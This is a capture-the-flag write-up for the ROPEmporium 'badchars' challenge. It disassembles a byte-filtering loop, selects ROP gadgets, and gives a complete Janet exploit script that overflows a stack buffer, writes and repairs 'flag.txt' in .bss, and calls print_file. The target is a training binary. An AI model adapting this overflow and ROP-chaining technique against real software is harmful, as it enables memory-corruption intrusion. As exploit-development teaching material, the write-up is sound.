# badchars (ROPEmporium Challenge 5)

## Analysis

As with the previous challenges, our buffer is still sized 0x20 bytes, but
there are an additional 0x20 bytes of stack space for other locals:

```
 972:	48 8d 45 c0          	lea    -0x40(%rbp),%rax
 976:	48 83 c0 20          	add    $0x20,%rax
 # not sure why we load the address at -0x40 and then add 0x20; why not just load address at -0x20?
 97a:	ba 00 02 00 00       	mov    $0x200,%edx
 97f:	48 89 c6             	mov    %rax,%rsi
 982:	bf 00 00 00 00       	mov    $0x0,%edi
 987:	e8 34 fe ff ff       	call   7c0 <read@plt>
```

This time, we read up to `0x200` bytes.
The actual amount of bytes read is stored on the stack and later used to
iterate over the input char by char.

```
│           0x0000098c      488945c0       mov qword [var_40h], rax
│           0x00000990      48c745c80000.  mov qword [var_38h], 0
│       ┌─< 0x00000998      eb51           jmp 0x9eb
│      ┌──> 0x0000099a      48c745d00000.  mov qword [var_30h], 0
│     ┌───< 0x000009a2      eb31           jmp 0x9d5
│    ┌────> 0x000009a4      488b45c8       mov rax, qword [var_38h]
│    ╎│╎│   0x000009a8      0fb64c05e0     movzx ecx, byte [rbp + rax - 0x20]
│    ╎│╎│   0x000009ad      488b45d0       mov rax, qword [var_30h]
│    ╎│╎│   0x000009b1      488b15280620.  mov rdx, qword [reloc.badcharacters] ; [0x200fe0:8]=0
│    ╎│╎│   0x000009b8      0fb60402       movzx eax, byte [rdx + rax]
│    ╎│╎│   0x000009bc      38c1           cmp cl, al
│   ┌─────< 0x000009be      7509           jne 0x9c9
│   │╎│╎│   0x000009c0      488b45c8       mov rax, qword [var_38h]
│   │╎│╎│   0x000009c4      c64405e0eb     mov byte [rbp + rax - 0x20], 0xeb
│   └─────> 0x000009c9      488b45d0       mov rax, qword [var_30h]
│    ╎│╎│   0x000009cd      4883c001       add rax, 1
│    ╎│╎│   0x000009d1      488945d0       mov qword [var_30h], rax
│    ╎│╎│   ; CODE XREF from sym.pwnme @ 0x9a2(x)
│    ╎└───> 0x000009d5      488b45d0       mov rax, qword [var_30h]
│    ╎ ╎│   0x000009d9      4883f803       cmp rax, 3
│    └────< 0x000009dd      76c5           jbe 0x9a4
│      ╎│   0x000009df      488b45c8       mov rax, qword [var_38h]
│      ╎│   0x000009e3      4883c001       add rax, 1
│      ╎│   0x000009e7      488945c8       mov qword [var_38h], rax
│      ╎│   ; CODE XREF from sym.pwnme @ 0x998(x)
│      ╎└─> 0x000009eb      488b55c8       mov rdx, qword [var_38h]
│      ╎    0x000009ef      488b45c0       mov rax, qword [var_40h]
│      ╎    0x000009f3      4839c2         cmp rdx, rax
│      └──< 0x000009f6      72a2           jb 0x99a
```

The above assembly could be described as doing:

```
Input mangling:
For each character:
  For all of the four bad chars:
    When the current char is the bad char:
      Replace the character with 0xEB (not a valid ASCII character)
      9c0:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
      9c4:	c6 44 05 e0 eb       	movb   $0xeb,-0x20(%rbp,%rax,1)
```

As in the previous challenge, we still store our "flag.txt" string in the
`.bss` section.

```sh
objdump -h badchars
# 23 .bss          00000008  0000000000601038  0000000000601038  00001038  2**0
#                  ALLOC
```

To do so, we string together two little gadgets.
The first loads the string and the address to store it under into registers:

```
  40069c:	41 5c                	pop    %r12   # "flag.txt"
  40069e:	41 5d                	pop    %r13   # address to stare string into 0x0000000000601038
  4006a0:	41 5e                	pop    %r14
  4006a2:	41 5f                	pop    %r15
  4006a4:	c3                   	ret
```

The second actually moves the string into the location pointed to by our
address.

```
  400634:	4d 89 65 00          	mov    %r12,0x0(%r13)
  400638:	c3                   	ret
```

Because of the string mangling happening in the `pwnme` function, we need to
find a way to fix the mangled string, before we can call `print_file@plt`.

Luckily, there are a bunch of useful gadgets helpfully provided to us.

```
0000000000400628 <usefulGadgets>:
  400628:	45 30 37             	xor    %r14b,(%r15)
  40062b:	c3                   	ret
  40062c:	45 00 37             	add    %r14b,(%r15)
  40062f:	c3                   	ret
  400630:	45 28 37             	sub    %r14b,(%r15)
  400633:	c3                   	ret
  400634:	4d 89 65 00          	mov    %r12,0x0(%r13)
  400638:	c3                   	ret
```

We could make use of either `xor` or `sub`, I spontaneously decided to go with
`sub`.

```
  400630:	45 28 37             	sub    %r14b,(%r15)
  400633:	c3                   	ret
```

Since the "bad" characters are all replaced with `0xEB` we need to subtract
the right amount from `0xEB` to end up with our required character.

```janet
# find the amount to subtract
# char = 0xEB - some_amount:
(- 0xEB (first (string/bytes char)))
```

As recommended by ROPEmporium, I wrote a little helper function to fix up the
bad chars.

```janet
(defn fixup-char
  [char address]
  (string/join ["\xA0\x06\x40\x00\x00\x00\x00\x00"                       # pop r14; pop r15 gadget
                (string/from-bytes (- 0xEB (first (string/bytes char)))) # r14b: amount to subtract
                "\x00\x00\x00\x00\x00\x00\x00"                           # r14: pad the rest of r14 with 0s
                address                                                  # r15: address of char
                "\x30\x06\x40\x00\x00\x00\x00\x00"                       # ret to sub fixup gadget
                ""]))
```

Once the string is fixed, we need to load its address into $rdi and then return
to `print_file@plt`.
To do so, we jump into the middle of the `pop $r15` instruction, which
effectively turns it into a `pop $rdi`.

```
 4006a2:	41 5f                	pop    %r15
 4006a4:	c3                   	ret
```

`5f` at `4006a3` makes it a `pop %rdi`.

The final exploit script looks like this:

```janet
(use sh)

#(print "\\x" (string/join (reverse (partition 2 "00000000004006A0")) "\\x"))
#(map (partial printf "%x") (string/bytes "flag.txt"))
#(print "\\x" (string/join ["66" "6c" "61" "67" "2e" "74" "78" "74"] "\\x"))
# \x66\x6c\x61\x67\x2e\x74\x78\x74

(defn fixup-char
  [char address]
  (string/join ["\xA0\x06\x40\x00\x00\x00\x00\x00" # pop r14; pop r15 gadget
                (string/from-bytes (- 0xEB (first (string/bytes char)))) "\x00\x00\x00\x00\x00\x00\x00" # r14: value to subtract
                address # r15: address of char
                "\x30\x06\x40\x00\x00\x00\x00\x00" # ret to sub fixup gadget
                ""]))

(def input (string/join [(string/repeat 'A 40) # overflow buffer
                         "\x9c\x06\x40\x00\x00\x00\x00\x00" # pop-slide gadget
                         "\x66\x6c\x61\x67\x2e\x74\x78\x74" # r12: "flag.txt" string
                         "\x38\x10\x60\x00\x00\x00\x00\x00" # r13: address at which to store string 
                         "\x00\x00\x00\x00\x00\x00\x00\x00" # r14:
                         "\x00\x00\x00\x00\x00\x00\x00\x00" # r15:
                         "\x34\x06\x40\x00\x00\x00\x00\x00" # mov %r12,0x0(%r13) gadget
                         (fixup-char "a" "\x3A\x10\x60\x00\x00\x00\x00\x00")
                         (fixup-char "g" "\x3B\x10\x60\x00\x00\x00\x00\x00")
                         (fixup-char "." "\x3C\x10\x60\x00\x00\x00\x00\x00")
                         (fixup-char "x" "\x3E\x10\x60\x00\x00\x00\x00\x00")
                         "\xa3\x06\x40\x00\x00\x00\x00\x00" # pop %rdi gadget
                         "\x38\x10\x60\x00\x00\x00\x00\x00" # address of string
                         "\x10\x05\x40\x00\x00\x00\x00\x00" # print_file@plt
                         ""]))
(spit "payload.txt" input)
($ ./badchars < ,input)
```
